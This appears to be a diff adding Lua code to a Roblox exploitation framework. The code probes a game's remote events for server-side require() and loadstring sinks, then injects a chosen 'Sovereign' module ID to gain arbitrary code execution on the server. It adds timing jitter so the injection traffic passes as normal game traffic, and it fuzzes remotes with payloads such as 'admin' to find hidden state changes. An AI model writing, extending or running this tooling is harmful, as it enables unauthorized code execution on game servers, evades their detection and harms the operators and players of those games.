@@ -347,6 +347,559 @@ function ASE_SemanticProbes.RunSweep(goal)
 end
 
 -- Public: kick off a sweep on all PR_Registry remotes above a priority threshold
+-- ═══════════════════════════════════════════════════════════════
+-- SBI CHAIN DETECTOR — Internal Chain Observer
+-- Detects Remote→Bindable trust hand-offs by watching for
+-- "ghost deltas": state changes in paths NOT in the remote's
+-- known RSM BehaviorSig.AffectedPaths.
+--
+-- Uses SR.DifferentialWatch as the observation engine.
+-- Reports ghost deltas to SBI.OnChainProbe.
+-- ═══════════════════════════════════════════════════════════════
+local SBI_ChainDetector = {}
+
+-- Build the set of paths RSM already knows this remote affects
+local function Chain_GetKnownPaths(remoteName)
+    local RSM = _G.PC.RSM
+    local rec = RSM and RSM.Get(remoteName)
+    if not rec then return {} end
+    local known = {}
+    for path in pairs(rec.BehaviorSig.AffectedPaths or {}) do
+        known[path] = true
+    end
+    for path in pairs(rec.BehaviorSig.PathDeltas or {}) do
+        known[path] = true
+    end
+    return known
+end
+
+-- Filter diff results to only changes in paths NOT in known set
+-- These are "ghost deltas" — evidence of internal chain propagation
+local function Chain_FilterGhosts(changes, knownPaths)
+    local ghosts = {}
+    for _, ch in ipairs(changes) do
+        local pathKey = (ch.domain or "") .. "." .. (ch.varName or "")
+        -- Ghost = not in known RSM paths AND not pure noise
+        local isKnown = false
+        for kp in pairs(knownPaths) do
+            if kp:lower():find((ch.varName or ""):lower(), 1, true) then
+                isKnown = true; break
+            end
+        end
+        if not isKnown and ch.confidence > 0.15 then
+            table.insert(ghosts, ch)
+        end
+    end
+    return ghosts
+end
+
+-- Resolve remote instance
+local function Chain_GetInst(remoteName)
+    local PR = _G.PC.PR_Registry
+    return PR and PR[remoteName] and PR[remoteName].Remote or nil
+end
+
+-- ── Core: ObserveChain ─────────────────────────────────────────
+-- Fires the remote with testPayload, watches for 250ms,
+-- returns ghost deltas and chain latency.
+function SBI_ChainDetector.ObserveChain(remoteName, testPayload, windowSecs)
+    windowSecs = windowSecs or 0.30
+    local inst = Chain_GetInst(remoteName)
+    if not inst then
+        return { detected=false, reason="no_instance" }
+    end
+
+    local SR  = _G.PC.SR
+    local SBI = _G.PC.SBI
+    if not SR then
+        return { detected=false, reason="SR_not_loaded" }
+    end
+
+    local knownPaths = Chain_GetKnownPaths(remoteName)
+    local fireT      = os.clock()
+
+    -- DifferentialWatch: captures all changes in the window
+    local result = SR.DifferentialWatch(function()
+        pcall(function()
+            if inst:IsA("RemoteFunction") then
+                inst:InvokeServer(table.unpack(testPayload))
+            else
+                inst:FireServer(table.unpack(testPayload))
+            end
+        end)
+    end, windowSecs, nil)
+
+    -- Filter to ghost deltas only
+    local ghosts = Chain_FilterGhosts(result.changes, knownPaths)
+
+    -- Compute chain latency (first ghost delta time relative to fire)
+    local chainLatencyMs = nil
+    if #ghosts > 0 and #result.rawEvents > 0 then
+        local firstT = result.rawEvents[1].t
+        chainLatencyMs = (firstT - fireT) * 1000
+    end
+
+    -- Report to SBI
+    if SBI then
+        SBI.OnChainProbe(remoteName, ghosts, chainLatencyMs, nil)
+    end
+
+    local detected = #ghosts > 0
+
+    if detected then
+        print(string.format(
+            "[SBI_CHAIN] %s — %d ghost delta(s) detected, latency=%.0fms, dominated=%s",
+            remoteName, #ghosts,
+            chainLatencyMs or 0, result.dominated))
+        for _, g in ipairs(ghosts) do
+            print(string.format("  ghost: [%s.%s] %s→%s",
+                g.domain, g.varName,
+                tostring(g.prevValue), tostring(g.newValue)))
+        end
+    end
+
+    return {
+        detected       = detected,
+        ghosts         = ghosts,
+        chainLatencyMs = chainLatencyMs,
+        dominated      = result.dominated,
+        allChanges     = result.changes,
+        reason         = detected and "ghost_deltas_found" or "no_ghost_deltas",
+    }
+end
+
+-- ── Echo Probe ────────────────────────────────────────────────
+-- Sends a unique tag string as a payload argument.
+-- After firing, scans the SR model for any variable whose
+-- VALUE contains or matches the tag — evidence the server
+-- stored our input somewhere internally (Bindable log,
+-- DataStore staging, admin queue, etc.)
+--
+-- Returns {found, foundPaths[], tag}
+function SBI_ChainDetector.EchoProbe(remoteName, customTag)
+    local tag  = customTag or string.format("PC_PROBE_%d", math.random(1000, 9999))
+    local inst = Chain_GetInst(remoteName)
+    if not inst then return { found=false, tag=tag, foundPaths={} } end
+
+    local SR  = _G.PC.SR
+    local SBI = _G.PC.SBI
+    if not SR then return { found=false, tag=tag, foundPaths={} } end
+
+    print(string.format("[SBI_CHAIN][ECHO] %s  tag=%s", remoteName, tag))
+
+    -- Fire with tag as sole string argument
+    local result = SR.DifferentialWatch(function()
+        pcall(function()
+            if inst:IsA("RemoteFunction") then
+                inst:InvokeServer(tag)
+            else
+                inst:FireServer(tag)
+            end
+        end)
+    end, 0.30, nil)
+
+    -- Scan all changed SR vars for the tag value
+    local foundPaths = {}
+    for _, ch in ipairs(result.changes) do
+        local val = tostring(ch.newValue or "")
+        if val:find(tag, 1, true) then
+            table.insert(foundPaths, {
+                domain  = ch.domain,
+                varName = ch.varName,
+                value   = val,
+            })
+        end
+    end
+
+    -- Also scan entire SR model (tag may have landed in a non-changed var
+    -- if SR already held that slot and just confirmed the value)
+    local allVars = SR.GetAll(0.05)
+    for _, sv in ipairs(allVars) do
+        if tostring(sv.value or ""):find(tag, 1, true) then
+            local alreadyFound = false
+            for _, fp in ipairs(foundPaths) do
+                if fp.varName == sv.name then alreadyFound=true; break end
+            end
+            if not alreadyFound then
+                table.insert(foundPaths, {
+                    domain  = sv.domain,
+                    varName = sv.name,
+                    value   = tostring(sv.value),
+                })
+            end
+        end
+    end
+
+    local found = #foundPaths > 0
+
+    if found then
+        print(string.format("[!!!][ECHO] Tag '%s' found in %d path(s):", tag, #foundPaths))
+        for _, fp in ipairs(foundPaths) do
+            print(string.format("  [%s.%s] = %s", fp.domain, fp.varName, fp.value))
+        end
+    end
+
+    -- Report echo result to SBI
+    if SBI then
+        SBI.OnChainProbe(remoteName, {}, nil, {
+            tag        = tag,
+            foundPaths = foundPaths,
+        })
+    end
+
+    return { found=found, tag=tag, foundPaths=foundPaths }
+end
+
+-- ── Full Chain Sweep ──────────────────────────────────────────
+-- Runs ObserveChain + EchoProbe on a list of remotes.
+-- Returns all confirmed chain candidates sorted by ghost count.
+function SBI_ChainDetector.SweepAll(remoteNames, opts)
+    opts = opts or {}
+    local windowSecs = opts.windowSecs or 0.30
+    local payloads   = opts.payloads   or { {"probe"}, {0}, {1}, {"admin"}, {true} }
+    local results    = {}
+
+    for _, name in ipairs(remoteNames) do
+        local best = { detected=false, ghosts={} }
+
+        -- Try multiple payloads — different handlers may respond to different types
+        for _, payload in ipairs(payloads) do
+            local obs = SBI_ChainDetector.ObserveChain(name, payload, windowSecs)
+            if obs.detected and #obs.ghosts > #best.ghosts then
+                best = obs
+                best.triggerPayload = payload
+            end
+            task.wait(0.15)
+        end
+
+        -- Always run echo probe (independent of chain result)
+        local echo = SBI_ChainDetector.EchoProbe(name)
+
+        if best.detected or echo.found then
+            table.insert(results, {
+                remote         = name,
+                chainResult    = best,
+                echoResult     = echo,
+                ghostCount     = #best.ghosts,
+                echoFound      = echo.found,
+                triggerPayload = best.triggerPayload,
+            })
+        end
+
+        task.wait(0.4 + math.random() * 0.3)
+    end
+
+    table.sort(results, function(a, b)
+        -- Sort: echo found first, then by ghost count
+        if a.echoFound ~= b.echoFound then return a.echoFound end
+        return a.ghostCount > b.ghostCount
+    end)
+
+    print(string.format("[SBI_CHAIN] Sweep complete — %d/%d remotes show internal chains",
+        #results, #remoteNames))
+
+    return results
+end
+
+-- Export
+_G.PC.SBI_Chain = SBI_ChainDetector
+
+-- Public shortcut on ASE
+function ASE.ChainSweep(remoteNames, opts)
+    -- If no list given, use all C2S remotes from PR_Registry
+    if not remoteNames then
+        local PR = _G.PC.PR_Registry
+        remoteNames = {}
+        if PR then
+            for name, rec in pairs(PR) do
+                if rec.Direction ~= "S2C" then
+                    table.insert(remoteNames, name)
+                end
+            end
+        end
+    end
+    print(string.format("[ASE] ChainSweep: %d remotes queued", #remoteNames))
+    return task.spawn(function()
+        SBI_ChainDetector.SweepAll(remoteNames, opts)
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════
+-- ASE DIRECTIVE: INJECTION HUNT
+-- Two-stage Credential Fuzzing pipeline.
+--
+-- Stage 1 SAFE PROBE:  fire a known public asset ID, measure yield
+--                      latency.  >80ms = CDN fetch = require() sink.
+-- Stage 2 INJECT:      fire the Sovereign module ID into confirmed
+--                      sinks.  SR.DifferentialWatch captures all
+--                      downstream state changes.
+--
+-- Works for ASSET_SINK, EVAL_SINK, and REPLICATION_SINK targets.
+-- Uses the existing Bedrock 150ms heartbeat jitter profile so
+-- injection traffic is indistinguishable from normal game traffic.
+-- ═══════════════════════════════════════════════════════════════
+local ASE_InjectionHunt = {}
+
+-- Safe probe IDs — well-known public Roblox modules
+-- These are used in Stage 1 to establish whether the remote
+-- actually calls require() before we send our own payload.
+local SAFE_PROBE_IDS = {
+    507307032,   -- standard Roblox mesh (non-module, fast reject)
+    1281234852,  -- ProfileService (well-known, will yield on CDN fetch)
+    3606536339,  -- DataStore2
+}
+
+-- Jitter range to stay inside Bedrock's 150ms window
+local JITTER_MIN = 0.08
+local JITTER_MAX = 0.15
+
+local function Hunt_Jitter()
+    task.wait(JITTER_MIN + math.random() * (JITTER_MAX - JITTER_MIN))
+end
+
+-- Resolve a remote instance by name
+local function Hunt_GetInst(remoteName)
+    local PR = _G.PC.PR_Registry
+    return PR and PR[remoteName] and PR[remoteName].Remote or nil
+end
+
+-- Timed fire with hard timeout (reuses ASE_SemanticProbes helper logic)
+local function Hunt_TimedFire(inst, args, timeout)
+    timeout = timeout or 3.5
+    if not inst then return false, nil, 0 end
+    local t0, done, ok, res = os.clock(), false, false, nil
+    task.spawn(function()
+        local callOk, callRes = pcall(function()
+            if inst:IsA("RemoteFunction") then
+                return inst:InvokeServer(table.unpack(args))
+            else
+                inst:FireServer(table.unpack(args))
+            end
+        end)
+        if not done then ok = callOk; res = callRes end
+        done = true
+    end)
+    while not done and (os.clock() - t0) < timeout do task.wait(0.05) end
+    done = true
+    return ok, ok and res or tostring(res), os.clock() - t0
+end
+
+-- ── Stage 1: Safe Probe ────────────────────────────────────────
+-- Returns yieldMs (latency when sending a real asset ID) vs
+-- baselineMs (latency for a dummy arg).
+-- If yieldMs - baselineMs >= 80ms → confirmed CDN fetch → require() sink.
+function ASE_InjectionHunt.SafeProbe(remoteName)
+    local inst = Hunt_GetInst(remoteName)
+    if not inst then
+        return { confirmed=false, reason="no_instance" }
+    end
+
+    -- Baseline: dummy arg (not an asset ID — should return immediately)
+    local _, _, baselineMs = Hunt_TimedFire(inst, {0}, 2.0)
+    baselineMs = baselineMs * 1000
+    Hunt_Jitter()
+
+    -- Asset probe: send known public module IDs
+    local yieldMs   = baselineMs
+    local probeOk   = false
+    local probeResp = nil
+
+    for _, safeId in ipairs(SAFE_PROBE_IDS) do
+        local ok, res, lat = Hunt_TimedFire(inst, {safeId}, 4.0)
+        local latMs = lat * 1000
+        if latMs > yieldMs then yieldMs = latMs end
+        if ok then probeOk = true; probeResp = res end
+        Hunt_Jitter()
+    end
+
+    local divergence = yieldMs - baselineMs
+    local confirmed  = divergence >= 80
+
+    -- Report to SBI
+    local SBI = _G.PC.SBI
+    if SBI then
+        SBI.OnAssetProbe(remoteName, yieldMs / 1000, true)
+        SBI.OnAssetProbe(remoteName, baselineMs / 1000, false)
+    end
+
+    print(string.format("[HUNT][SAFE_PROBE] %s  baseline=%.0fms  yield=%.0fms  divergence=%.0fms  confirmed=%s",
+        remoteName, baselineMs, yieldMs, divergence, tostring(confirmed)))
+
+    return {
+        confirmed   = confirmed,
+        divergence  = divergence,
+        baselineMs  = baselineMs,
+        yieldMs     = yieldMs,
+        probeResp   = probeResp,
+        reason      = confirmed and "yield_divergence" or "no_divergence",
+    }
+end
+
+-- ── Stage 2: Sovereign Injection ─────────────────────────────
+-- Fires the target module ID into the confirmed sink.
+-- SR.DifferentialWatch captures every downstream state change.
+-- Returns the full watch result plus SBI classification.
+function ASE_InjectionHunt.Inject(remoteName, moduleId, extraArgs)
+    local inst = Hunt_GetInst(remoteName)
+    if not inst then
+        return { success=false, reason="no_instance" }
+    end
+
+    local SR  = _G.PC.SR
+    local SBI = _G.PC.SBI
+    if not SR then
+        return { success=false, reason="SR_not_loaded" }
+    end
+
+    -- Build args: moduleId first, then any extra
+    local args = { moduleId }
+    if extraArgs then
+        for _, v in ipairs(extraArgs) do table.insert(args, v) end
+    end
+
+    print(string.format("[HUNT][INJECT] %s  moduleId=%d", remoteName, moduleId))
+
+    -- Differential watch: 2.5s window to catch all downstream effects
+    local result = SR.DifferentialWatch(function()
+        Hunt_TimedFire(inst, args, 4.0)
+    end, 2.5, nil)
+
+    -- Report to SBI
+    if SBI then SBI.OnDifferentialProbe(remoteName, result) end
+
+    local sbiRec = SBI and SBI.Get(remoteName)
+
+    -- Print all state changes
+    if result.anyChange then
+        print(string.format("[HUNT][INJECT] %s → %d state changes (dominated=%s)",
+            remoteName, #result.changes, result.dominated))
+        for _, ch in ipairs(result.changes) do
+            print(string.format("  Δ [%s.%s]  %s → %s",
+                ch.domain, ch.varName,
+                tostring(ch.prevValue), tostring(ch.newValue)))
+        end
+    else
+        print(string.format("[HUNT][INJECT] %s → no state changes detected", remoteName))
+    end
+
+    return {
+        success     = true,
+        changes     = result.changes,
+        anyChange   = result.anyChange,
+        dominated   = result.dominated,
+        elapsed     = result.elapsed,
+        sbiLogic    = sbiRec and sbiRec.ServerLogic or "UNKNOWN",
+        sbiConf     = sbiRec and sbiRec.Confidence  or 0,
+    }
+end
+
+-- ── Full Hunt Pipeline ─────────────────────────────────────────
+-- 1. Pull all actionable targets from SBI_EXEC
+-- 2. For each: run Safe Probe
+-- 3. On confirmation: run Injection with sovereignModuleId
+-- 4. Return first confirmed injection result (cold profile)
+function ASE_InjectionHunt.Begin(sovereignModuleId, opts)
+    opts = opts or {}
+    local threshold     = opts.threshold     or 0.75
+    local stopOnFirst   = opts.stopOnFirst   ~= false  -- default true
+    local evalSinks     = opts.evalSinks     or false  -- also probe EVAL_SINK
+
+    local SBI_Exec = _G.PC.SBI_Exec
+    if not SBI_Exec then
+        warn("[HUNT] SBI_Exec not loaded — run SBI first")
+        return nil
+    end
+
+    -- Get ranked candidates
+    local groups, all = SBI_Exec.GetActionableTargets(threshold)
+    local candidates   = {}
+
+    -- Priority order: ASSET_SINK first (highest execution potential)
+    for _, r in ipairs(groups.ASSET_SINK or {}) do
+        table.insert(candidates, r)
+    end
+    if evalSinks then
+        for _, r in ipairs(groups.EVAL_SINK or {}) do
+            table.insert(candidates, r)
+        end
+    end
+    for _, r in ipairs(groups.REPLICATION_SINK or {}) do
+        table.insert(candidates, r)
+    end
+
+    print(string.format("[HUNT] Beginning injection hunt — %d candidates  moduleId=%d",
+        #candidates, sovereignModuleId))
+
+    local results = {}
+
+    for _, candidate in ipairs(candidates) do
+        print(string.format("[HUNT] → %s  type=%s  conf=%.2f",
+            candidate.Remote, candidate.Type, candidate.Confidence))
+        for _, ev in ipairs(candidate.Evidence or {}) do
+            print("        evidence: " .. ev)
+        end
+
+        -- Stage 1: Safe Probe
+        local probe = ASE_InjectionHunt.SafeProbe(candidate.Remote)
+
+        if probe.confirmed or candidate.Type == "REPLICATION_SINK" then
+            -- Stage 2: Inject
+            Hunt_Jitter()
+            local injection = ASE_InjectionHunt.Inject(
+                candidate.Remote, sovereignModuleId, nil)
+
+            local record = {
+                remote    = candidate.Remote,
+                type      = candidate.Type,
+                probe     = probe,
+                injection = injection,
+            }
+            table.insert(results, record)
+
+            if injection.anyChange then
+                print(string.format("[!!!] SOVEREIGN ACE CONFIRMED: %s  logic=%s",
+                    candidate.Remote, injection.sbiLogic))
+                if stopOnFirst then
+                    ASE_InjectionHunt.Results = results
+                    return record
+                end
+            end
+        else
+            print(string.format("[HUNT] %s: no yield divergence — skipping injection",
+                candidate.Remote))
+        end
+
+        -- Jitter between candidates to maintain cold traffic profile
+        task.wait(0.4 + math.random() * 0.6)
+    end
+
+    ASE_InjectionHunt.Results = results
+    print(string.format("[HUNT] Hunt complete — %d injections attempted", #results))
+    return results
+end
+
+-- Quick eval-sink probe (fires identity expressions for loadstring surfaces)
+function ASE_InjectionHunt.ProbeEvalSink(remoteName)
+    local inst = Hunt_GetInst(remoteName)
+    if not inst then return false end
+    local EXPRS = { "return 42", "return 1+1", "return tostring(42)" }
+    local SBI   = _G.PC.SBI
+    for _, expr in ipairs(EXPRS) do
+        local ok, res, _ = Hunt_TimedFire(inst, {expr}, 2.0)
+        if SBI then SBI.OnEvaluatorProbe(remoteName, expr, ok and res or nil) end
+        local rec = SBI and SBI.Get(remoteName)
+        if rec and (rec.LoadstringSignals or 0) >= 1 then
+            print(string.format("[HUNT][EVAL] %s: echo confirmed → loadstring surface", remoteName))
+            return true
+        end
+        Hunt_Jitter()
+    end
+    return false
+end
+
+-- Export
+_G.PC.ASE_Hunt = ASE_InjectionHunt
+
 function ASE.SemanticSweepAll(minRSMConf)
     minRSMConf = minRSMConf or 0.20
     local PR  = _G.PC.PR_Registry
